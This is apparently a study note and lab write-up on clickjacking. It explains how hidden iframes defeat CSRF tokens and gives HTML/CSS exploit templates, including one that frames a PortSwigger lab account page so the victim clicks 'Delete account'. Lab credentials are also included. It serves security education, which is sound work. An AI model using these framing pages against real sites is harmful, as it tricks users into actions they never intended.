## What is clickjacking?

   Clickjacking is a type of cyber attack where a user is tricked into clicking on something on one website, while they're actually interacting with a different website that's hidden from view.

**Consider the following example:**
A person visits a fake website, often through a link in an email, and clicks on a button, thinking they're winning a prize. However, without their knowledge, an attacker tricks them into clicking on a hidden button, which causes them to make a payment on a different website. This method involves adding an unseen web page with a clickable button or hidden link, often within an iframe.

Unlike a CSRF attack, where an attacker tricks a user into unknowingly sending a request, clickjacking makes the user perform an action, like clicking a button, without their awareness.

![[clickjacking1.png]]

- To guard against CSRF attacks, websites often use something called a CSRF token, which is a unique, one-time code tied to a user's session.
- Clickjacking attacks aren't prevented by CSRF tokens because they involve an authentic website where all actions occur on the same domain. CSRF tokens are used in regular sessions, but in a clickjacking attack, the actions take place within a hidden iframe, making the CSRF token ineffective.

## How to construct a basic clickjacking attack

   - Clickjacking attacks use CSS to create and manipulate layers.
   - The attacker puts the real website on top of the fake one like a see-through layer, using an iframe.

**An example using the style tag and parameters is as follows:**
```jsx
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```

- In a clickjacking attack, the attacker positions the real website inside the user's browser so that it perfectly aligns with the fake one, using size and positioning values. They use these values to ensure it works on different screens, browsers, and platforms.
- They also control the stacking order of the real website and the fake one using the z-index.
- To make the real website invisible to the user, they set its opacity to a very low value, close to 0.
- Some browsers have protections against this, but attackers carefully choose opacity values to avoid detection and achieve their goal.

## Steps to solve lab - 
### Title - Basic clickjacking with CSRF token protection

**Desc** - This lab contains login functionality and a delete account button that is protected by a [CSRF](https://portswigger.net/web-security/csrf) token. A user will click on elements that display the word "click" on a decoy website. To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted. 

**Creds** - wiener:peter

**Note** - The victim will be using Chrome so test your exploit on that browser.

1. Log in to your account on the target website.
  ![[clickjacking2.png]]

2. Go to the exploit server and paste the following HTML template into the **Body** section:
```jsx
<html lang="en">
<head>
	<style>
		*{
			margin: 0;
			padding: 0;
			box-sizing: border-box;
		}
		#target_website {
			position:relative;
			width:800px;
			height:600px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			top: 495;
			left: 77;
			}
	</style>
</head>
<body>
	<div id="decoy_website">
		<button class="click" type="submit">Click Me</button>
	</div>
	<iframe id="target_website" src="YOUR-LAB-ID.web-security-academy.net/my-account">
	</iframe>
</body>
</html>
```

4. Click **Store** and then **View exploit**.
5. Click on **Deliver exploit to victim** and the lab should be solved.
![[clickjacking3.png]]

**After clicking on view exploit, we got something as follows** - 
![[clickjacking4.png]]
